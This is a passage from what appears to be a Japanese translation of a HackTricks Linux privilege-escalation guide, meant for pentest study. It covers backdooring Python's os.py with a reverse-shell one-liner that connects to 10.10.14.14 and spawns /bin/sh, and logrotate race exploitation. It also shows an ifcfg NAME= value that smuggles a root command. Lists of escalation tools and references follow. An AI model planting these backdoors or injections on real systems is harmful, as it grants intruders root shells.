Pythonスクリプトが実行される**場所**を把握しており、そのフォルダに書き込み権限があるか、Pythonライブラリを**変更できる**場合、OSライブラリを変更してバックドアを設置できます（Pythonスクリプトが実行される場所に書き込み権限がある場合、os.pyライブラリをコピーして貼り付けてください）。

ライブラリにバックドアを設置するには、os.pyライブラリの最後に次の行を追加します（IPとPORTを変更してください）:
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate`の脆弱性により、ログファイルまたはその親ディレクトリに**書き込み権限**を持つユーザーが特権を昇格する可能性があります。これは、`logrotate`が**root**として実行されることが多いため、特に_**/etc/bash\_completion.d/**_のようなディレクトリで任意のファイルを実行するように操作できるためです。_**/var/log**_だけでなく、ログのローテーションが適用されているすべてのディレクトリのアクセス権限を確認することが重要です。

{% hint style="info" %}
この脆弱性は`logrotate`バージョン`3.18.0`およびそれ以前に影響します
{% endhint %}

この脆弱性に関する詳細情報は、次のページで確認できます: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)。

この脆弱性は[**logrotten**](https://github.com/whotwagner/logrotten)を使用して悪用できます。

この脆弱性は[**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** に非常に類似しており、ログを変更できることがわかった場合は、ログをシンボリックリンクに置き換えて特権を昇格できるかどうかを確認してください。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**脆弱性リファレンス:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

何らかの理由で、ユーザーが_**/etc/sysconfig/network-scripts**_に`ifcf-<whatever>`スクリプトを**書き込む**ことができるか、既存のスクリプトを**調整**できる場合、システムは**乗っ取られています**。

ネットワークスクリプト、例えば_ifcg-eth0_はネットワーク接続に使用されます。これらは.INIファイルとまったく同じように見えます。ただし、LinuxではNetwork Manager (dispatcher.d)によって\~ソース化\~されます。

私の場合、これらのネットワークスクリプトでの`NAME=`属性が正しく処理されていません。名前に**空白スペースがあると、システムは空白スペースの後にある部分を実行しようとします**。つまり、**最初の空白スペースの後にあるすべてがrootとして実行されます**。

例: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
### **init、init.d、systemd、および rc.d**

ディレクトリ `/etc/init.d` には、**System V init (SysVinit)** 用のスクリプトが格納されており、これは**クラシックなLinuxサービス管理システム**です。これには、サービスを `start`、`stop`、`restart`、そして時には `reload` するためのスクリプトが含まれています。これらは直接実行するか、`/etc/rc?.d/` で見つかるシンボリックリンクを介して実行できます。Redhatシステムでは、代替パスとして `/etc/rc.d/init.d` があります。

一方、`/etc/init` は**Upstart**に関連しており、これはUbuntuによって導入された新しい**サービス管理**であり、サービス管理タスクのための構成ファイルを使用します。Upstartへの移行にもかかわらず、Upstartに互換性レイヤーがあるため、SysVinitスクリプトは引き続きUpstart構成と共に使用されています。

**systemd** は、オンデマンドデーモンの起動、自動マウント管理、およびシステム状態のスナップショットなどの高度な機能を提供する現代的な初期化およびサービスマネージャーとして登場しています。配布パッケージのファイルは `/usr/lib/systemd/` に、管理者の変更は `/etc/systemd/system/` に整理され、システム管理プロセスを効率化しています。

## その他のトリック

### NFS 特権昇格

{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no\_root\_squash-misconfiguration-pe.md)
{% endcontent-ref %}

### 制限されたシェルからの脱出

{% content-ref url="escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](escaping-from-limited-bash.md)
{% endcontent-ref %}

### Cisco - vmanage

{% content-ref url="cisco-vmanage.md" %}
[cisco-vmanage.md](cisco-vmanage.md)
{% endcontent-ref %}

## カーネルセキュリティ保護

* [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
* [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## その他のヘルプ

[Static impacket binaries](https://github.com/ropnop/impacket\_static\_binaries)

## Linux/Unix 特権昇格ツール

### **Linuxローカル特権昇格ベクターを探すための最良のツール:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t オプション)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** LinuxおよびMACでカーネルの脆弱性を列挙する [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local\_exploit\_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (物理アクセス):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**その他のスクリプトのまとめ**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## 参考文献

* [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\\
* [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\\
* [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\\
* [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\\
* [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\\
* [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\\
* [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\\
* [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\\
* [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
* [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
* [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
* [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
* [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
* [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
* [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
* [https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)
* [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)

<details>

<summary><strong>**htARTE (HackTricks AWS Red Team Expert)** でゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>こちら</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい**、または **HackTricks をPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* 独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) コレクションである [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見
* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)** に参加するか、[telegramグループ](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live) をフォローする
* **HackTricks** と **HackTricks Cloud** のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有する

</details>
